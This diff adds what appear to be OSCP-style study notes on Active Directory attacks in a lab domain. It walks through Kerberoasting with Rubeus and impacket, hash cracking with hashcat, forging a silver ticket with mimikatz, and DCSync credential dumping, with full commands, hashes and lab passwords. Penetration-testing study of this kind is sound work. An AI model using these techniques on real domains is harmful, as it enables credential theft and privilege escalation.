@@ -294,3 +294,245 @@ If you happen to have GenericWrite or GenericAll on another AD user account, ins
 
 ### Kerberoasting
 
+In Kerberos, when requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.
+
+These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.
+
+If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account. This technique is known as Kerberoasting.
+
+```console
+kali$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.208.75 /drive:shared,/tmp
+
+PS> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+[*] Target Domain          : corp.com
+[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : iis_service
+[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
+[*] ServicePrincipalName   : HTTP/web04.corp.com:80
+[*] PwdLastSet             : 9/7/2022 5:38:43 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash written to C:\Tools\hashes.kerberoast
+
+// copy hashes.kerberoast to kali
+
+$kali
+cat hashes.kerberoast
+$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$8684779CD6592BDDBCF00BE086C8ECD3$D0FDD66B013002C3700C2985C9411E1E67B23A0FF261E5134E9DACBE7E893AA90303A8D869C6F79D2100A66917C2193B2E708E750FC10710B115A04C6FE0CB394FF48D419A0C5B152100A3504386F63B59F6735A84AE115AA90F843C75C608EB489589A43B89ED9AE76F5FA4544EFCCFB9652D560C9C4BA3C1FC067EF7AD5F9566EA2DE3A8A4BF1CA3E8F6F2EF0DF816E66998AE8C9C2905A94B25817CA79B22C6C1022FCF5E7E0A01763301F4942298A13DD4AC5E2488768AC209D2F234C3E3010AAD6D34ADD4C89F763CBD7C1AC659E819EB477CAB2EDCF2726529B2C53865AB1FBDDCD412D6A1886B601287C60E4D6D700E2C1B99A37893A451C9B3E05184F42B737C0EBA3536BEAF8D58236C14E50F55C1FAE87D741365348EB18581B787A1640431E40354D7408CDC4858F9DC5602BE7F2F2BBFE05598F8263DF518D474BEA18D774F014B86C9EBD977301C8825A21B5551DC1EE8236EECB7253540317A5ECAFC609DCA84641FF58616197661A61388236832602BFC1D8F618FB7327D6EC20DF73143ED8BC4302A25A679FC85643EF79D694C3E2405152B74C44B50BAAA2E5B06ADC19780BF323249F2CC02909EA71073BBE61ACC83D24316419B1EAA8006A91634440A6C8953B97D69254469618DEB1DA6D7C192118D7C41D79143605E09E44DB0A7CBDD69ACD1C5B0DF657C98D80A06854B8B89CFB40CC409094FDDF6349633F31FD9101798BE984C90078A3D2BE0AD699DD1883E892BCCEBF23C043DF952AFE7517A05A44AE20EE8AABDFA72513EDBADDA07B20424C9781E3F2DB1DBFC03A51BC1726E80DA335D3F45B61556EDFB68DA203CB0872EBB9E25C0BEEB029404E946F482469089B078D0922DF1A9E3E4C44B573C5A51F028516DBAFD881ACA5B51B21284BF8D6D92FCE8436F0AC5953B4055B848C0F3D0A6ADE2073EC904E076760FDCE837E5E33C59C24F6E97E534C029A3DE06CCD1DD0579D477CD63FD8447C3C6532EC81589A277E1B0FED1748ED1E2725C99312DB04AE1633EF3EDF2855C593D6D2E1203D949BB5ABACD0DA85CBC73DD5A9434EFF40C3F80C43C7BF01064CA810DBA4CB74A59A00D3FAF3B7E650B02A4DAFBD150BCC77ECEC0181067B4992E9E6AE56E4B0C9A7939CFA97F30304B40B88E9934A77AA40AF85FC9ACED0E56E9A41EE4C4154DEB5F95BD7DFDCFB192EF77E332FE830621AFC3018BF4DDDDD10625D5FBB0DEA7DB278D681CBC51BBC042EF8AB242DBE53741EA7DDF9090041347A28293F4DB7A44CEBC4B67086A5988ADA63DAB55A69EA80409560166A77F8AF02021F9195EE22BCBA4B2A31E9DA705B65C5A1B994D12277DF36043425C71EB60000FD72879308A36D68555C46578E655B1D97F8A4EDE250C6797F40CE8ACD93C1067284B08FFD63D2CC8673D8E5A15DFF3030451D1126D69682A31D97B24D1D2F147F74C15F794D4F8668FCA552961424B3CCAF2
+
+kali$ hashcat --help | grep -i "Kerberos"
+  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
+
+kali$ sudo hashcat -m 13100 hashes.kerberoast /home/kali/Desktop/oscp/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$8684779cd6592bddbcf00be086c8ecd3$d0fdd66b013002c3700c2985c9411e1e67b23a0ff261e5134e9dacbe7e893aa90303a8d869c6f79d2100a66917c2193b2e708e750fc10710b115a04c6fe0cb394ff48d419a0c5b152100a3504386f63b59f6735a84ae115aa90f843c75c608eb489589a43b89ed9ae76f5fa4544efccfb9652d560c9c4ba3c1fc067ef7ad5f9566ea2de3a8a4bf1ca3e8f6f2ef0df816e66998ae8c9c2905a94b25817ca79b22c6c1022fcf5e7e0a01763301f4942298a13dd4ac5e2488768ac209d2f234c3e3010aad6d34add4c89f763cbd7c1ac659e819eb477cab2edcf2726529b2c53865ab1fbddcd412d6a1886b601287c60e4d6d700e2c1b99a37893a451c9b3e05184f42b737c0eba3536beaf8d58236c14e50f55c1fae87d741365348eb18581b787a1640431e40354d7408cdc4858f9dc5602be7f2f2bbfe05598f8263df518d474bea18d774f014b86c9ebd977301c8825a21b5551dc1ee8236eecb7253540317a5ecafc609dca84641ff58616197661a61388236832602bfc1d8f618fb7327d6ec20df73143ed8bc4302a25a679fc85643ef79d694c3e2405152b74c44b50baaa2e5b06adc19780bf323249f2cc02909ea71073bbe61acc83d24316419b1eaa8006a91634440a6c8953b97d69254469618deb1da6d7c192118d7c41d79143605e09e44db0a7cbdd69acd1c5b0df657c98d80a06854b8b89cfb40cc409094fddf6349633f31fd9101798be984c90078a3d2be0ad699dd1883e892bccebf23c043df952afe7517a05a44ae20ee8aabdfa72513edbadda07b20424c9781e3f2db1dbfc03a51bc1726e80da335d3f45b61556edfb68da203cb0872ebb9e25c0beeb029404e946f482469089b078d0922df1a9e3e4c44b573c5a51f028516dbafd881aca5b51b21284bf8d6d92fce8436f0ac5953b4055b848c0f3d0a6ade2073ec904e076760fdce837e5e33c59c24f6e97e534c029a3de06ccd1dd0579d477cd63fd8447c3c6532ec81589a277e1b0fed1748ed1e2725c99312db04ae1633ef3edf2855c593d6d2e1203d949bb5abacd0da85cbc73dd5a9434eff40c3f80c43c7bf01064ca810dba4cb74a59a00d3faf3b7e650b02a4dafbd150bcc77ecec0181067b4992e9e6ae56e4b0c9a7939cfa97f30304b40b88e9934a77aa40af85fc9aced0e56e9a41ee4c4154deb5f95bd7dfdcfb192ef77e332fe830621afc3018bf4ddddd10625d5fbb0dea7db278d681cbc51bbc042ef8ab242dbe53741ea7ddf9090041347a28293f4db7a44cebc4b67086a5988ada63dab55a69ea80409560166a77f8af02021f9195ee22bcba4b2a31e9da705b65c5a1b994d12277df36043425c71eb60000fd72879308a36d68555c46578e655b1d97f8a4ede250c6797f40ce8acd93c1067284b08ffd63d2cc8673d8e5a15dff3030451d1126d69682a31d97b24d1d2f147f74c15f794d4f8668fca552961424b3ccaf2:Strawberry1
+
+```
+
+Now, let's try from Linux.
+
+```console
+kali$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.208.70 corp.com/pete
+Password: // must use domain user creds (used pete's in this case)
+ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon                   Delegation    
+----------------------  -----------  --------  --------------------------  --------------------------  -------------
+HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  2023-03-01 06:40:02.088156  unconstrained 
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$88524b2156ae0a9aa7b2af67df98cc31$7cab55becc05a71b4d3b09339fd6814d7bfa1ff228429fc1f7e30a4b1421136d18e9316313a6f7c9640a4038e277e8e5caa28d414181763c550d3c46fdf45734da34169c9e35d59436f5cc57c6d8cb74913508bbb1a46f7bf538b27da330797333734c2c36e2bce1b7a2bdb5d897a8cf4487b9a5347eecf39fcd864d373c47762fadf174e03ac195718b2cc7ba0f031f7195fe2ba1a8ce922b55116ce703db5a9ba42e1ab438f0d2ad94614c516e72dda8aa5e8800acf3a7294440f76fed23b01c6050e1d45d6a4bdc540d063aec8eeac04df73b9194495868da526a513537f11b1472e77225b26f942a4032b7a09409bf731485b0e0cc50ddc0707723860b1f1228a35d0d08e087e809a60977823ecc122b838acb4002b68ed5f5a5218c83d3d57abb033eeb5f596bc303402313d095cb027849455105ae33207a76187a713f64957ea34ef6d9781b63d653250b08d4be17b9a39b64d437e1ddf88adb178588bfb117581151483aef937d37aaa49108dad09ca6bed99e687a8a004dd7b012c7db135a4c6ad19c91b4f943d348f5cec8af29b1d3475fbd24c0f16ec37bb3116409d35b018d772c2588d6c25e8bbab49d761c71e74e860c784eecf942a0284d2b889036c0553408d3c5d4b36309dd398232807d0e1ce6187bb8b48d955c693893ec5c6c7d27985cccd778861804033e20f7891b90c4fcb04eba46d8084adaa34ee05c771f99e869f0855538e15d0bfabc00f889f670405b3b47b72870f27e2a748f9f986aca44960175f31b030de8f6a948a043950e08e5fee154a21cc3af427e9e35983fbfe7a1693438515350e68136e2088cd852da02a1ee19fcc3a6a809cc2e0ef67f554b41c2b5d912d58a1c3d874e32d5d1bdd56f2fc77b51fd13f5afcbcacac2ee70968ed2e7d094129c7f4576b7f074f73489b1d5389f6b6b7954a4af76d0dc10119fc9f2bcac13fd0cd36d61c85e9b43025914269c0f25678bf24fe40390681eb3ab7f1aa769c213a7f0a5077f2ea1c8c0b97e36364c587794f4a72de5afc16d2ea08a0463ec9f7a6349ab2e50ba31b648dae95e3c3adb025ae485f507adf5cc1e0de61f5a091659e858f4ecdfb93df0d8af9b9c92e9c057c30c17954ab408acaf42aecc2aff55b0f11529ce85c25bec399c6f613a6f06b838d4dc7f1e90fd1bc85e2c2c426a9a5aec66a8b706f4951d9a45bac3fbae63f692168c38632a1202e87d83a1ef03f300d634f258629801f8aa4e84da867dce49bc58d850b102e06b0966496366434814a00cb4035d6bcb8864cdc7fce1af636bd465925f69f1432a8b67b6adcb46e501812afe0e8387c1a2be79d60f6477d3a91b
+
+// copy hash to a file
+
+$ sudo hashcat -m 13100 hashes.kerberoast2 /home/kali/Desktop/oscp/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$88524b2156ae0a9aa7b2af67df98cc31$7cab55becc05a71b4d3b09339fd6814d7bfa1ff228429fc1f7e30a4b1421136d18e9316313a6f7c9640a4038e277e8e5caa28d414181763c550d3c46fdf45734da34169c9e35d59436f5cc57c6d8cb74913508bbb1a46f7bf538b27da330797333734c2c36e2bce1b7a2bdb5d897a8cf4487b9a5347eecf39fcd864d373c47762fadf174e03ac195718b2cc7ba0f031f7195fe2ba1a8ce922b55116ce703db5a9ba42e1ab438f0d2ad94614c516e72dda8aa5e8800acf3a7294440f76fed23b01c6050e1d45d6a4bdc540d063aec8eeac04df73b9194495868da526a513537f11b1472e77225b26f942a4032b7a09409bf731485b0e0cc50ddc0707723860b1f1228a35d0d08e087e809a60977823ecc122b838acb4002b68ed5f5a5218c83d3d57abb033eeb5f596bc303402313d095cb027849455105ae33207a76187a713f64957ea34ef6d9781b63d653250b08d4be17b9a39b64d437e1ddf88adb178588bfb117581151483aef937d37aaa49108dad09ca6bed99e687a8a004dd7b012c7db135a4c6ad19c91b4f943d348f5cec8af29b1d3475fbd24c0f16ec37bb3116409d35b018d772c2588d6c25e8bbab49d761c71e74e860c784eecf942a0284d2b889036c0553408d3c5d4b36309dd398232807d0e1ce6187bb8b48d955c693893ec5c6c7d27985cccd778861804033e20f7891b90c4fcb04eba46d8084adaa34ee05c771f99e869f0855538e15d0bfabc00f889f670405b3b47b72870f27e2a748f9f986aca44960175f31b030de8f6a948a043950e08e5fee154a21cc3af427e9e35983fbfe7a1693438515350e68136e2088cd852da02a1ee19fcc3a6a809cc2e0ef67f554b41c2b5d912d58a1c3d874e32d5d1bdd56f2fc77b51fd13f5afcbcacac2ee70968ed2e7d094129c7f4576b7f074f73489b1d5389f6b6b7954a4af76d0dc10119fc9f2bcac13fd0cd36d61c85e9b43025914269c0f25678bf24fe40390681eb3ab7f1aa769c213a7f0a5077f2ea1c8c0b97e36364c587794f4a72de5afc16d2ea08a0463ec9f7a6349ab2e50ba31b648dae95e3c3adb025ae485f507adf5cc1e0de61f5a091659e858f4ecdfb93df0d8af9b9c92e9c057c30c17954ab408acaf42aecc2aff55b0f11529ce85c25bec399c6f613a6f06b838d4dc7f1e90fd1bc85e2c2c426a9a5aec66a8b706f4951d9a45bac3fbae63f692168c38632a1202e87d83a1ef03f300d634f258629801f8aa4e84da867dce49bc58d850b102e06b0966496366434814a00cb4035d6bcb8864cdc7fce1af636bd465925f69f1432a8b67b6adcb46e501812afe0e8387c1a2be79d60f6477d3a91b:Strawberry1
+```
+
+Let's assume that we are performing an assessment and notice that we have GenericWrite or GenericAll permissions on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting.
+
+### Silver Tickets
+
+We'll go one step further and forge our own service tickets with any permissions we desire. If the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.
+
+In general, we need to collect the following three pieces of information to create a silver ticket:
+
+- SPN password hash
+- Domain SID
+- Target SPN
+
+```console
+kali$ In general, we need to collect the following three pieces of information to create a silver ticket:
+
+    SPN password hash
+    Domain SID
+    Target SPN
+
+// confirm that our current user does not have access to the resource of the HTTP SPN mapped to iis_service.
+PS> iwr -UseDefaultCredentials http://web04
+iwr : Server Error
+401 - Unauthorized: Access is denied due to invalid credentials.
+You do not have permission to view this directory or page using the credentials that you supplied.
+At line:1 char:1
++ iwr -UseDefaultCredentials http://web04
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc
+   eption
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+// since we are Local Admin on this machine where iis_service has an active session, mimikatz!
+
+PS> .\mimikatz.exe
+
+mimikatz# privilege::debug
+User Name         : iis_service
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 4/22/2024 1:47:02 PM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1109
+        msv :
+         [00000003] Primary
+         * Username : iis_service
+         * Domain   : CORP
+         * NTLM     : 4d28cf5252d39971419580a51484ca09
+         
+// now get the domain SID - ONLY PART OF THE BELOW OUTPUT
+// the domain SID in this case is S-1-5-21-1987370270-658905905-1781884369
+
+> whoami /user
+User Name SID
+========= =============================================
+corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
+
+// lastly, get the target SPN
+// we'll target the HTTP SPN resource on WEB04 (HTTP/web04.corp.com:80) because we want to access the web page running on IIS
+
+// now, build the cmd to get a silver ticket
+
+mimikatz# kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+User      : jeffadmin
+Domain    : corp.com (CORP)
+SID       : S-1-5-21-1987370270-658905905-1781884369
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
+Service   : http
+Target    : web04.corp.com
+Lifetime  : 4/22/2024 2:04:11 PM ; 4/20/2034 2:04:11 PM ; 4/20/2034 2:04:11 PM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
+
+// confirm ticket is in memory
+
+PS> klist
+Current LogonId is 0:0x30dc73
+
+Cached Tickets: (1)
+
+#0>     Client: jeffadmin @ corp.com
+        Server: http/web04.corp.com @ corp.com
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
+        Start Time: 4/22/2024 14:04:11 (local)
+        End Time:   4/20/2034 14:04:11 (local)
+        Renew Time: 4/20/2034 14:04:11 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called:
+```
+
+A new service ticket for the SPN HTTP/web04.corp.com has been loaded into memory and Mimikatz set appropriate group membership permissions in the forged ticket. From the perspective of the IIS application, the current user will be both the built-in local administrator ( Relative Id: 500 ) and a member of several highly-privileged groups, including the Domain Admins group ( Relative Id: 512 ).
+
+```console
+// verify access
+
+PS> iwr -UseDefaultCredentials http://web04
+PS C:\Tools> iwr -UseDefaultCredentials http://web04
+
+StatusCode        : 200
+StatusDescription : OK
+
+// to get the source code immediately
+PS> PS C:\Tools> (iwr -UseDefaultCredentials http://web04).Content | findstr /i "OS{"
+```
+
+We now have access to the web page as jeffadmin. We did not need access to the plaintext password or password hash of this user!
+
+Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions. This is a great way of accessing SPNs in later phases of a penetration test, as we need privileged access in most situations to retrieve the password hash of the SPN.
+
+### Domain Controller Synchronization
+
+In production environments, domains typically rely on more than one domain controller to provide redundancy. The Directory Replication Service (DRS) Remote Protocol uses replication to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, using the IDL_DRSGetNCChanges API. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.
+
+To do this, a user needs to have the following rights, which, by default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.
+- Replicating Directory Changes
+- Replicating Directory Changes All
+- Replicating Directory Changes in Filtered Set
+
+If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.
+
+```console
+kali$ xfreerdp /cert-ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.208.75 /drive:shared,/tmp
+
+PS> .\mimikatz.exe
+
+mimikatz# lsadump::dcsync /user:corp\dave
+
+mimikatz# lsadump::dcsync /user:corp\dave
+[DC] 'corp.com' will be the domain
+[DC] 'DC1.corp.com' will be the DC server
+[DC] 'corp\dave' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : dave
+
+** SAM ACCOUNT **
+
+SAM Username         : dave
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
+Account expiration   :
+Password last change : 9/7/2022 9:54:57 AM
+Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
+Object Relative ID   : 1103
+
+Credentials:
+  Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494  // here it is!!!
+    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
+    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
+    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
+    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
+
+// copy it over to kali
+
+kali$ hashcat -m 1000 hashes.dcsync /home/kali/Desktop/oscp/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+08d7a47a6f9f66b97b1bae4178747494:Flowers1 
+```
+
+We can now obtain the NTLM hash of any domain user account of the domain corp.com. Notably, we can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator Administrator.
+
+```console
+mimikatz# lsadump::dcsync /user:corp\Administrator
+```
+
+Let's perform dcsync from Linux now.
+
+```console
+kali$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.208.70
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
+[*] Cleaning up...
+
+// we only need this emd of the hash: "08d7a47a6f9f66b97b1bae4178747494"
+```
